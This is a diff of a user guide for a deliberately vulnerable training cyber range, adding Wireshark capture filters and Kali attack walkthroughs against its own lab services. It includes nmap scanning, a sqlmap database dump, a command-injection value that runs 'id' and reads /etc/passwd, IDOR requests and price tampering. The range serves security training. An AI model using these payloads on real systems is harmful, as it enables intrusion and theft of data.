@@ -1,88 +1,106 @@
-# 📖 Cyber Range Platform - Complete User & Administration Guide
+# 📖 Dadiwoo Cyber Range Platform - Complete User, Wireshark & Kali Linux Penetration Testing Guide
 
-Welcome to the **Cyber Range Microservices Platform**. This comprehensive guide explains how to start, configure, manage, and use the platform for cybersecurity testing, red/blue team exercises, and general networking simulation.
+Welcome to the **Dadiwoo Cyber Range Microservices Platform**. This guide covers system startup, Manager Dashboard navigation, Wireshark packet capture analysis, and Kali Linux penetration testing workflows.
 
 ---
 
-## 📸 Platform Interface Visual Overview
+## 📸 Manager Dashboard Visual Interface
 
-### 1. Central Manager Control Plane (Port 9000)
-The Central Manager Dashboard provides a unified control panel for all microservices, port allocations, environment purpose toggles, update checks, and Mini DNS configuration.
+The redesigned Manager Dashboard displays microservice cards with:
+- **Header**: `🛡 Dadiwoo Central Cyber Range Control Plane`.
+- **Search Bar**: Search by keyword or tag (`osint`, `wifi`, `sqli`, `idor`, `command-injection`, `financial`, `retail`, `bluetooth`).
+- **Simultaneous Action Buttons**: Dedicated `▶ Start` and `⏹ Stop` controls on each card.
+- **Settings Modal (`⚙️ Settings`)**: Popup for configuring Environment Purpose (`cybersecurity` vs `networking`), Local Domain, Port, and Difficulty Level.
+- **Pagination**: 20 microservice cards per page.
 
 ![Manager Dashboard](docs/images/manager_dashboard.png)
 
 ---
 
-### 2. Microservice Targets Overview
+## 🦈 1. Capturing Traffic with Wireshark
 
-| Service | Port | Local URL | Screenshots | Primary Vulnerabilities |
-| :--- | :--- | :--- | :--- | :--- |
-| **🏧 ATM Simulator** | `8080` | `http://atm.lab:8080` | ![ATM Lab](docs/images/atm_lab.png) | IDOR / BOLA, Negative Balance Withdrawal Flaw |
-| **🏦 Online Banking** | `8081` | `http://bank.lab:8081` | ![Bank Lab](docs/images/bank_lab.png) | SQL Injection (SQLi), Reflected XSS |
-| **🌐 ISP Portal** | `8082` | `http://isp.lab:8082` | ![ISP Lab](docs/images/isp_lab.png) | Command Injection in Ping Tool, RADIUS API |
-| **🎓 Student Portal** | `8083` | `http://school.lab:8083` | ![School Lab](docs/images/school_lab.png) | Arbitrary File Upload, Student Transcript IDOR |
-| **🛒 E-Commerce Store** | `8084` | `http://shop.lab:8084` | ![Shop Lab](docs/images/shop_lab.png) | Client Price Tampering, Coupon Reuse Flaw |
+When testing or attacking any microservice, you can use **Wireshark** to capture HTTP/DNS packets and analyze network traffic in real time.
+
+### How to Capture Microservice Traffic in Wireshark:
+1. Open Wireshark on your host machine or Ubuntu VM:
+   ```bash
+   sudo wireshark
+   ```
+2. Select the interface bound to your range network (e.g. `lo` for localhost testing, or `eth0` / `docker0` / `vbr0` for GNS3/EVE-NG bridges).
+3. Apply a Wireshark Display Filter to focus on microservice traffic:
+   - **Filter HTTP Traffic on Lab Ports**:
+     ```text
+     http && (tcp.port == 8080 || tcp.port == 8081 || tcp.port == 8082 || tcp.port == 8083 || tcp.port == 8084 || tcp.port == 8085)
+     ```
+   - **Filter Mini DNS Traffic**:
+     ```text
+     dns && udp.port == 5353
+     ```
+4. **What You Will See in Wireshark**:
+   - **Unencrypted HTTP Packets**: See POST form parameters (`card_number`, `pin`, `username`, `password`, `amount`, `attacker_mac`).
+   - **Header Inspection**: Observe cookie session headers (`session_account=ACC-1001`) and HTTP 503 response codes when in General Networking Mode.
+   - **DNS Queries**: Watch UDP queries resolving `atm.lab`, `bank.lab`, `isp.lab`, `school.lab`, `shop.lab`, `mobile.lab` to `<HOST_IP>`.
 
 ---
 
-## 🚀 Step-by-Step Quickstart Instructions
+## 🐉 2. Attacking Microservices with Kali Linux Tools
 
-### Step 1: Starting the Microservices & Manager
-Run the platform launcher script directly on your Ubuntu VM host:
+You can attack the microservices from a Kali Linux VM or Kali container on your lab network.
+
+### A. Reconnaissance & Port Scanning (Nmap)
+Map all microservice ports on your Cyber Range host:
+```bash
+nmap -p 8080-8085,9000,5353 -sV <UBUNTU_VM_IP>
+```
+
+### B. Bluetooth & Mobile Exfiltration - Mobile Lab (`:8085`)
+Simulate Bluetooth pairing or exfiltrate phonebook contacts:
+```bash
+# Pair with default pin '0000'
+curl -X POST http://<UBUNTU_VM_IP>:8085/bluetooth/pair \
+     -d "attacker_mac=00:11:22:33:44:55&pin=0000"
+
+# Unauthenticated contact exfiltration API
+curl -s http://<UBUNTU_VM_IP>:8085/api/v1/bluetooth/exfiltrate
+```
+
+### C. SQL Injection Testing (sqlmap) - Online Banking (`:8081`)
+Exploit search parameter SQLi on the Banking Portal:
+```bash
+sqlmap -u "http://<UBUNTU_VM_IP>:8081/?q=Allowance" --cookie="session_user=user1" --batch --dbs
+```
+
+### D. Parameter Injection / Command Execution - ISP Portal (`:8082`)
+Test diagnostic tool command injection using `curl` or Burp Suite:
+```bash
+curl -X POST http://<UBUNTU_VM_IP>:8082/diagnostics \
+     -d "host=127.0.0.1; id; cat /etc/passwd"
+```
+
+### E. IDOR & Logic Flaw Testing - ATM (`:8080`) & Shop (`:8084`)
+Exploit Insecure Direct Object References:
+```bash
+# Fetch admin details and CTF flag from ATM API
+curl -s http://<UBUNTU_VM_IP>:8080/api/v1/accounts/ACC-9000
+
+# Client-side price tampering on E-Commerce Store
+curl -X POST http://<UBUNTU_VM_IP>:8084/checkout \
+     -d "product_id=1&price=0.01&coupon=DISCOUNT20"
+```
+
+---
+
+## 🚀 Microservices Quickstart Summary
 
 ```bash
 chmod +x start_labs.sh
 ./start_labs.sh
 ```
 
-All services will start automatically on distinct individual ports:
-- **Manager Control Plane**: `http://<YOUR_HOST_IP>:9000`
-- **ATM Simulator**: `http://<YOUR_HOST_IP>:8080`
-- **Online Banking**: `http://<YOUR_HOST_IP>:8081`
-- **ISP Portal**: `http://<YOUR_HOST_IP>:8082`
-- **Student Portal**: `http://<YOUR_HOST_IP>:8083`
-- **E-Commerce Store**: `http://<YOUR_HOST_IP>:8084`
-
----
-
-### Step 2: Configuring Individual Port Allocations
-You can customize the listening port for any microservice:
-
-1. Open the Manager Dashboard at `http://<YOUR_HOST_IP>:9000`.
-2. Locate the microservice card you wish to configure (e.g., *Online Banking Portal Lab*).
-3. Update the **Individual Port Allocation** input field (e.g. change `8081` to `8888`).
-4. Click **Save & Apply**.
-5. The application will immediately synchronize the new port setting across the control plane!
-
----
-
-### Step 3: Setting Up UDP Mini DNS Resolver (`mini_dns.py`)
-To allow virtual routers in GNS3, EVE-NG, or client attack machines to resolve `.lab` domain names (`atm.lab`, `bank.lab`, `isp.lab`, `school.lab`, `shop.lab`):
-
-1. On the Manager Dashboard, navigate to the **Mini DNS Resolver Server Settings** panel.
-2. Toggle **Enable UDP Mini DNS Server** to `🟢 Enabled`.
-3. Set the **Target Host IP Address** to your Ubuntu VM host IP (e.g. `192.168.1.100` or `10.50.0.10`).
-4. Set the **DNS UDP Port** (default: `5353`).
-5. Click **Save & Apply DNS Settings**.
-6. On your attack machine or GNS3 virtual router, set your DNS server address to `<UBUNTU_VM_IP>:5353`.
-
----
-
-### Step 4: Dual Environment Purpose Modes
-
-Administrators can switch microservices between two modes:
-
-#### 1. ⚔️ Cybersecurity Lab Target Mode
-- Full vulnerability scenarios, login forms, API authorization flaws, and CTF flags are active for penetration testing.
-
-#### 2. 🌐 General Networking Test Node Mode
-- Microservices remain 100% reachable via HTTP GET and `ping` for testing routing, firewalls, and subnets inside GNS3 / EVE-NG.
-- State-modifying POST requests and authentication endpoints return `HTTP 503 Service Unavailable (Network Test Node)`.
-
----
-
-### Step 5: Checking for Platform Updates
-To verify if your cyber range platform is synchronized with the latest release:
-
-1. Click the **🔄 Check for Updates** button in the top right header of the Manager Dashboard (`http://<YOUR_HOST_IP>:9000`).
-2. The dashboard will query `/api/v1/system/check-update` and display live status confirmation.
+- **🛡 Dadiwoo Manager Control Plane**: `http://<YOUR_HOST_IP>:9000`
+- **🏧 Dadiwoo ATM Simulator**: `http://<YOUR_HOST_IP>:8080`
+- **🏦 Dadiwoo Online Banking**: `http://<YOUR_HOST_IP>:8081`
+- **🌐 Dadiwoo ISP Portal**: `http://<YOUR_HOST_IP>:8082`
+- **🎓 Dadiwoo Student Portal**: `http://<YOUR_HOST_IP>:8083`
+- **🛒 Dadiwoo E-Commerce Store**: `http://<YOUR_HOST_IP>:8084`
+- **📱 Dadiwoo Smartphone Lab**: `http://<YOUR_HOST_IP>:8085`
